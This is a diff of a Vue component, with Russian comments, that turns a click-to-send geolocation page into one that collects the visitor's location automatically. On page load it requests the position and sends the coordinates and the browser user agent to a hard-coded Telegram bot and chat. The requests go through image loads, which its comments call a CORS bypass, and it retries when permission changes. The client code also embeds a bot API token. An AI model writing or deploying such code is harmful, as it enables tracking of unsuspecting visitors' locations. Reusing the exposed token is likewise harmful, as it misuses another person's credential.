@@ -1,6 +1,6 @@
 <template>
   <div class="geo-wrap">
-    <h2>Отправка геолокации в Telegram (без бэка)</h2>
+    <h2>Авто-отправка геолокации в Telegram</h2>
 
     <p :class="statusClass">{{ statusMessage }}</p>
 
@@ -11,90 +11,85 @@
       <div>Время: {{ new Date(coords.timestamp).toLocaleString() }}</div>
     </div>
 
-    <div class="actions">
-      <button @click="requestLocation" :disabled="loading">Отправить локацию</button>
-      <button @click="reset" class="secondary" :disabled="loading">Сбросить</button>
-    </div>
-
     <small class="note">
-      ⚠️ Токен хранится в клиенте — используйте только для тестов и затем смените его.<br>
-      Требуется HTTPS или <code>localhost</code> для геолокации.
+      Работает на HTTPS или <code>localhost</code>. Токен хранится в клиенте — только для тестов.
     </small>
   </div>
 </template>
 
 <script setup>
-import { ref } from "vue"
+import { ref, onMounted } from "vue"
 
-// ⚠️ Ваши данные — видны пользователю, не храните в продакшене
+// ⚠️ Ваши данные — видны пользователю (НЕ для продакшена)
 const BOT_TOKEN = "6499214149:AAF6xgZAIGXsO3mqdtiF_nMW-6N4sxOSECg"
 const CHAT_ID   = "6873895827"
 
-// reactive state
-const statusMessage = ref("Готов к запросу геолокации…")
+// state
+const statusMessage = ref("Инициализация…")
 const statusClass = ref("info")
 const coords = ref(null)
-const loading = ref(false)
+const sending = ref(false)
 
-// отправка GET-запроса через изображение (обход CORS)
+// --- утилита: GET-запрос через Image (обход CORS ответа) ---
 function fireGet(url) {
   return new Promise(resolve => {
     const img = new Image()
-    img.onload = img.onerror = () => resolve(true)
-    img.src = url + (url.includes("?") ? "&" : "?") + "_=" + Date.now()
+    img.onload = img.onerror = () => resolve(true) // факт запроса важнее статуса ответа
+    img.src = url + (url.includes("?") ? "&" : "?") + "_=" + Date.now() // cache-bust
   })
 }
 
-// отправка локации и текста в Telegram
+// --- отправка локации и текста в Telegram ---
 async function sendLocationToTelegram(lat, lon) {
   const base = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}`
-  const urlLoc = `${base}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`
+  const urlLoc = `${base}/sendLocation?chat_id=${encodeURIComponent(CHAT_ID)}&latitude=${encodeURIComponent(lat)}&longitude=${encodeURIComponent(lon)}`
   await fireGet(urlLoc)
 
   const text = encodeURIComponent(
     `📍 Новая локация\n🌍 ${lat}, ${lon}\n🕓 ${new Date().toISOString()}\n📱 ${navigator.userAgent}`
   )
-  const urlMsg = `${base}/sendMessage?chat_id=${CHAT_ID}&text=${text}`
+  const urlMsg = `${base}/sendMessage?chat_id=${encodeURIComponent(CHAT_ID)}&text=${text}`
   await fireGet(urlMsg)
 }
 
-// запрос геолокации и отправка
-function requestLocation() {
+// --- единоразовый запрос геолокации и отправка ---
+function requestAndSend() {
   if (!("geolocation" in navigator)) {
     statusMessage.value = "Геолокация не поддерживается браузером"
     statusClass.value = "err"
     return
   }
 
-  loading.value = true
   statusMessage.value = "Запрашиваю разрешение на геолокацию…"
   statusClass.value = "info"
+  sending.value = true
 
   navigator.geolocation.getCurrentPosition(
     async pos => {
       const { latitude, longitude, accuracy } = pos.coords
       coords.value = { latitude, longitude, accuracy, timestamp: pos.timestamp }
 
-      statusMessage.value = "Отправляю в Telegram…"
+      statusMessage.value = "Отправляю координаты в Telegram…"
       statusClass.value = "info"
 
       try {
         await sendLocationToTelegram(latitude, longitude)
         statusMessage.value = "Координаты отправлены ✅"
         statusClass.value = "ok"
-      } catch {
+      } catch (e) {
+        console.error(e)
         statusMessage.value = "Ошибка отправки в Telegram"
         statusClass.value = "err"
       } finally {
-        loading.value = false
+        sending.value = false
       }
     },
     err => {
-      loading.value = false
+      sending.value = false
       if (err.code === err.PERMISSION_DENIED) {
         statusMessage.value = "Пользователь отклонил доступ к геолокации"
       } else {
-        statusMessage.value = "Ошибка получения геолокации: " + err.message
+        statusMessage.value = "Ошибка получения геолокации: " + (err?.message || "неизвестная ошибка")
       }
       statusClass.value = "err"
     },
@@ -102,16 +97,44 @@ function requestLocation() {
   )
 }
 
-function reset() {
-  coords.value = null
-  statusMessage.value = "Готов к запросу геолокации…"
-  statusClass.value = "info"
-}
+// --- Автозапуск при входе ---
+// Попытаемся сначала узнать состояние разрешения (если поддерживается Permissions API),
+// чтобы корректно отобразить статус. В любом случае вызываем requestAndSend().
+onMounted(async () => {
+  try {
+    if (navigator.permissions && navigator.permissions.query) {
+      // Может быть: 'granted' | 'prompt' | 'denied'
+      const res = await navigator.permissions.query({ name: "geolocation" })
+      if (res.state === "granted") {
+        statusMessage.value = "Доступ уже разрешён. Отправляю…"
+      } else if (res.state === "prompt") {
+        statusMessage.value = "Требуется разрешение на геолокацию…"
+      } else {
+        statusMessage.value = "Доступ к геолокации запрещён в настройках браузера"
+        statusClass.value = "err"
+      }
+      // При изменении статуса в реальном времени:
+      res.onchange = () => {
+        // Если пользователь в настройках включит доступ, можно повторно отправить:
+        if (res.state === "granted" && !sending.value && !coords.value) {
+          requestAndSend()
+        }
+      }
+    } else {
+      statusMessage.value = "Проверяю доступ к геолокации…"
+    }
+  } catch {
+    // игнорируем — продолжим обычным запросом
+  }
+
+  // Немного отложим, чтобы UI отрисовался, и запрашиваем сразу
+  setTimeout(requestAndSend, 50)
+})
 </script>
 
 <style scoped>
 .geo-wrap {
-  max-width: 480px;
+  max-width: 520px;
   margin: 60px auto;
   background: #111827;
   color: #e2e8f0;
@@ -119,6 +142,7 @@ function reset() {
   border-radius: 16px;
   font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
   text-align: center;
+  box-shadow: 0 10px 30px rgba(0,0,0,.35);
 }
 .coords {
   background: #0b1220;
@@ -128,33 +152,19 @@ function reset() {
   margin: 16px 0;
   font-family: ui-monospace, monospace;
 }
-.actions {
-  display: flex;
-  justify-content: center;
-  gap: 12px;
-  margin-bottom: 12px;
-}
-button {
-  border: none;
-  border-radius: 10px;
-  padding: 10px 16px;
-  font-weight: 600;
-  cursor: pointer;
-  background: #2563eb;
-  color: white;
-}
-button.secondary {
-  background: #334155;
-}
-button[disabled] {
-  opacity: 0.6;
-  cursor: not-allowed;
-}
 .info { color: #94a3b8; }
 .ok   { color: #22c55e; }
 .err  { color: #ef4444; }
 .note {
+  display: block;
+  margin-top: 8px;
   font-size: 12px;
   color: #94a3b8;
+}
+code {
+  background: #0b1220;
+  border: 1px solid #1f2937;
+  padding: 2px 6px;
+  border-radius: 6px;
 }
 </style>
